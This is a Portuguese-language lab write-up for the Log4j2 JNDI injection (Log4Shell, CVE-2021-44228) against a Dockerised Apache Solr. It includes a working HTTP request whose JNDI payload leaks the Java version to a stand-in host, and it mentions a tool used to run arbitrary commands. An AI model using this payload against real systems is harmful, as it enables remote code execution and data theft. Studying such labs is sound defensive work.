# Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228)

O Apache Log4j 2 é uma atualização do Log4j que oferece melhorias significativas em relação ao seu predecessor, Log4j 1.xe fornece muitas das melhorias disponíveis no Logback enquanto corrige alguns problemas inerentes à arquitetura do Logback.

Em dezembro de 2021, uma exploração de 0 dia no Apache Log4j2 foi descoberta. O suporte JNDI do Log4j não restringiu quais nomes podem ser resolvidos. Alguns protocolos como `rmi:` e `ldap:` não são seguros ou podem permitir a execução remota de código.

Referências:

- https://logging.apache.org/log4j/2.x/security.html
- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://xz.aliyun.com/t/10649

## Ambiente de vulnerabilidade

O Apache Log4j2 não é um determinado serviço da web, é apenas uma biblioteca de terceiros, portanto, podemos usar um aplicativo que depende do Log4j2 para demonstrar como explorar essa vulnerabilidade.

Execute o seguinte comando para iniciar um Apache Solr 8.11.0, que usa o Log4j 2.14.1:

```
docker-compose up -d
```

Após iniciar o servidor, navegue em `http://your-ip:8983` para ver o portal de administração do Apache Solr.

## Exploit

Simplesmente, coloque a carga útil `${jndi:dns://${sys:java.version}.example.com}` como a ação do administrador que pode acionar a consulta JNDI.

```
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close


```

A consulta será mostrada no log DNS:
![](1.png)

Explore a injeção de JNDI com [esta ferramenta](https://github.com/su18/JNDI) para executar comandos arbitrários, `touch /tmp/success` é executado com sucesso:

![](2.png)
